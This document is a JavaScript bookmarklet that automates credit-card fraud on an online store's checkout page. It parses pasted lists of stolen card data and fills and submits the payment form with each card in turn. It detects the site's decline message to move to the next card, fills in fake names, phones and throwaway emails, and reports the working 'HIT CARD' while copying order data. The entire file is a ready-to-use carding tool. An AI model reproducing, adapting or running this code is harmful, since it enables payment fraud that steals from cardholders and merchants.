javascript:(async function(){
    const UI_ID="slick-v7-nuclear";
    const FAIL_TEXT="We are sorry, but we are unable to process your payment.";
    
    let existing=document.getElementById(UI_ID);
    if(existing){existing.remove()}
    
    let state={observer:null,queue:[],index:0,isRunning:false};
    window.slickLock = false; 
    
    const utils={
        randAlpha:(n)=>Array.from({length:n},()=>"abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random()*36)]).join(''),
        randName:()=>({
            f:["John","Jane","Peter","Mary","David","Susan","Michael","Linda","James","Maria"][Math.floor(Math.random()*10)],
            l:["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"][Math.floor(Math.random()*10)]
        }),
        randPhone:()=>{
            const r=(min,max)=>Math.floor(Math.random()*(max-min+1))+min;
            return `${r(2,9)}${Math.floor(Math.random()*100).toString().padStart(2,'0')}${r(2,9)}${Math.floor(Math.random()*1000000).toString().padStart(6,'0')}`
        },
        randEmail:function(){return `${this.randAlpha(10)}@${["remium.best","assetsreciever.xyz"][Math.floor(Math.random()*2)]}`},
        parseInput:(input)=>{
            if(input.trim().startsWith('[')){return JSON.parse(input.trim())}
            return input.trim().split('\n').map(line=>{
                const p=line.split('|');
                if(p.length<4){return null}
                return{card:p[0],month:p[1],year:p[2],cvv:p[3],zip:p[8]||"10001",raw:line}
            }).filter(c=>c!==null)
        },
        copy:(text)=>{
            try{
                if(navigator.clipboard&&window.isSecureContext){navigator.clipboard.writeText(text);return true}
                const t=document.createElement("textarea");
                t.value=text;t.style.position="fixed";document.body.appendChild(t);t.select();
                const s=document.execCommand("copy");document.body.removeChild(t);return s
            }catch(err){return false}
        },
        simulateInput:(el,val)=>{
            if(!el){return}
            el.focus();el.dispatchEvent(new FocusEvent("focus",{bubbles:true}));
            el.value=val;el.dispatchEvent(new Event("input",{bubbles:true}));
            el.dispatchEvent(new Event("change",{bubbles:true}));
            el.blur();el.dispatchEvent(new FocusEvent("blur",{bubbles:true}))
        }
    };
    
    const updateStat=(txt,col)=>{
        const s=document.getElementById("af-stat");
        if(s){s.innerText=txt;s.style.color=col||"#888"}
    };
    
    function handleSuccess(){
        if(!state.isRunning){return}
        state.isRunning=false;
        if(state.observer){state.observer.disconnect()}
        
        const winningCard=state.queue[state.index-1];
        const orderData=sessionStorage.getItem("lastPlacedOrder");
        
        const sucBox=document.getElementById("af-success");
        if(sucBox){
            sucBox.style.display="block";
            sucBox.innerText=`SUCCESS!\nHIT CARD: ${winningCard?winningCard.raw:"Unknown"}`
        }
        updateStat("SUCCESS","#0f0");
        
        document.getElementById("af-body").style.display = "none";
        document.getElementById("af-min-btn").innerText = "[ + ]";
        
        if(orderData){
            let domsText=`/doms data: ${ orderData }`;
            let copied=utils.copy(domsText);
            if(copied){alert("Payment Successful! Order Data Copied:\n\n"+domsText)}
            else{prompt("Payment Successful! Browser blocked copy. Press Ctrl+C:",domsText)}
        }else{
            alert("Payment Successful! (lastPlacedOrder not found in session)");
        }
    }
    
    function fillAndSubmit(card){
        if(!card){return}
        window.slickLock = true; 
        
        const radioBtn=document.getElementById('payment-type-card');
        const radioLabel=document.querySelector('label[for="payment-type-card"]');
        if(radioBtn&&!radioBtn.checked){
            radioBtn.click();radioBtn.dispatchEvent(new Event('change',{bubbles:true}));
            if(radioLabel){radioLabel.click()}
        }
        
        const map={cardNumber:card.card,cardExpirationDate:`${card.month }/${card.year }`,cardCVV:card.cvv,cardBillingZIPCode:card.zip};
        for(const[name,val]of Object.entries(map)){
            const el=document.querySelector(`input[name='${ name }']`);
            if(el){utils.simulateInput(el,val)}
        }
        
        setTimeout(()=>{
            const b=document.querySelector('button[type="submit"]');
            if(b&&!b.disabled){
                b.click();
                setTimeout(() => { window.slickLock = false; }, 1200);
            } else {
                window.slickLock = false;
            }
        },500)
    }
    
    function tryNext(){
        if(!state.isRunning){return}
        if(state.index>=state.queue.length){
            updateStat("FAILED ALL","#f44");
            state.isRunning=false;
            if(state.observer){state.observer.disconnect()}
            return
        }
        updateStat(`TRYING ${state.index+1}/${state.queue.length }`,"#ffac33");
        fillAndSubmit(state.queue[state.index]);
        state.index+=1
    }
    
    function startAll(){
        try{
            if(state.observer){state.observer.disconnect();state.observer=null}
            const raw=document.getElementById("af-txt").value;
            state.queue=utils.parseInput(raw);
            if(!state.queue.length){return}
            
            state.index=0;
            state.isRunning=true;
            window.slickLock = false; 
            document.getElementById("af-success").style.display="none";
            
            if(document.getElementById("af-chk").checked){
                const n=utils.randName();
                const d={firstName:n.f,lastName:n.l,email:utils.randEmail(),phoneNumber:utils.randPhone()};
                Object.entries(d).forEach(([name,val])=>{
                    const el=document.querySelector(`input[name='${ name }']`);
                    if(el){utils.simulateInput(el,val)}
                })
            }
            
            state.observer=new MutationObserver((mutations)=>{
                const isConfirmed=Array.from(document.querySelectorAll('h1')).some(h1=>h1.textContent.includes("Order Confirmation"));
                const cardInputGone=document.querySelector("input[name='cardNumber']")===null;
                if(isConfirmed&&cardInputGone){handleSuccess();return}
                
                if(window.slickLock) return;
                
                let failDetected=false;
                for(const m of mutations){
                    if(m.type==="childList"&&m.addedNodes.length>0){
                        m.addedNodes.forEach(node=>{
                            if(node.nodeType===1&&node.textContent.includes(FAIL_TEXT)){
                                failDetected=true
                            }
                        })
                    }
                }
                
                if(failDetected&&state.isRunning){
                    window.slickLock = true; 
                    tryNext()
                }
            });
            
            state.observer.observe(document.body,{childList:true,subtree:true});
            tryNext()
        }catch(e){alert("Format Error")}
    }
    
    /* --- INLINE UI CREATION (Bypasses CSP and Stacking Contexts) --- */
    const ui=document.createElement("div");
    ui.id=UI_ID;
    // Massive inline styling block
    ui.style.cssText = "position: fixed; top: 10px; right: 10px; width: 250px; background: rgba(10,10,10,0.98); border: 2px solid #333; border-radius: 8px; z-index: 2147483647; font-family: monospace; color: #eee; padding: 10px; box-shadow: 0 15px 40px rgba(0,0,0,0.9); box-sizing: border-box; overflow: hidden;";
    
    ui.innerHTML=`
        <div id="af-drag" style="cursor: move; touch-action: none; font-size: 12px; font-weight: bold; color: #777; display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px solid #333; padding-bottom: 6px; user-select: none;">
            <span>V7.0_MOBILE</span>
            <div style="display:flex; gap:12px; align-items:center;">
                <span id="af-stat">IDLE</span>
                <span id="af-min-btn" style="cursor:pointer; color:#fff; font-size: 14px; padding: 0 5px;">[ - ]</span>
            </div>
        </div>
        <div id="af-body">
            <div style="font-size:10px; margin-bottom:6px; display:flex; justify-content:space-between; align-items:center;">
                RAND_CONTACT <input type="checkbox" id="af-chk" checked style="transform: scale(1.2); margin:0;">
            </div>
            <textarea id="af-txt" rows="4" style="width: 100%; background: #000; border: 1px solid #333; color: #0f0; font-size: 11px; padding: 6px; box-sizing: border-box; resize: none; margin-bottom: 8px; font-family: monospace;"></textarea>
            <div style="display: flex; gap: 5px;">
                <button id="af-run" style="flex: 1; font-size: 11px; padding: 10px 0; cursor: pointer; background: #111; color: #238636; border: 1px solid #238636; font-weight: bold; border-radius: 4px;">RUN</button>
                <button id="af-clr" style="flex: 1; font-size: 11px; padding: 10px 0; cursor: pointer; background: #111; color: #aaa; border: 1px solid #444; font-weight: bold; border-radius: 4px;">CLR</button>
                <button id="af-stop" style="flex: 1; font-size: 11px; padding: 10px 0; cursor: pointer; background: #111; color: #da3633; border: 1px solid #da3633; font-weight: bold; border-radius: 4px;">STOP</button>
            </div>
            <div id="af-success" style="display: none; background: #0b1a0b; border: 1px solid #238636; color: #0f0; font-size: 10px; padding: 8px; margin-top: 10px; word-break: break-all; border-radius: 4px;"></div>
        </div>
    `;
    
    // Attach to HTML root, NOT the body, to escape layout traps
    (document.documentElement || document.body).appendChild(ui);
    
    document.getElementById("af-run").onclick=startAll;
    document.getElementById("af-clr").onclick=()=>document.getElementById("af-txt").value="";
    document.getElementById("af-stop").onclick=()=>{
        state.isRunning=false;
        window.slickLock = false; 
        if(state.observer){state.observer.disconnect();state.observer=null}
        updateStat("STOPPED","#f44")
    };
    
    /* --- COLLAPSE LOGIC --- */
    let isMin = false;
    document.getElementById("af-min-btn").onclick = (e) => {
        isMin = !isMin;
        const body = document.getElementById("af-body");
        if(isMin) {
            body.style.display = "none";
            e.target.innerText = "[ + ]";
            ui.style.width = "auto"; 
        } else {
            body.style.display = "block";
            e.target.innerText = "[ - ]";
            ui.style.width = "250px";
        }
    };

    /* --- MOBILE & DESKTOP DRAG LOGIC --- */
    let drag=false, off=[0,0];
    const header = document.getElementById("af-drag");

    const dragStart = (e) => {
        if(e.target.id === "af-min-btn") return; 
        drag = true;
        const clientX = e.touches ? e.touches[0].clientX : e.clientX;
        const clientY = e.touches ? e.touches[0].clientY : e.clientY;
        off = [ui.offsetLeft - clientX, ui.offsetTop - clientY];
    };
    
    const dragMove = (e) => {
        if(!drag) return;
        if(e.touches && e.cancelable) e.preventDefault(); // Stop mobile scroll
        const clientX = e.touches ? e.touches[0].clientX : e.clientX;
        const clientY = e.touches ? e.touches[0].clientY : e.clientY;
        ui.style.left = (clientX + off[0]) + 'px';
        ui.style.top = (clientY + off[1]) + 'px';
        ui.style.right = 'auto'; 
    };
    
    const dragEnd = () => { drag = false; };

    header.addEventListener('mousedown', dragStart);
    document.addEventListener('mousemove', dragMove, {passive: false});
    document.addEventListener('mouseup', dragEnd);

    header.addEventListener('touchstart', dragStart, {passive: false});
    document.addEventListener('touchmove', dragMove, {passive: false});
    document.addEventListener('touchend', dragEnd);
    document.addEventListener('touchcancel', dragEnd);
})();
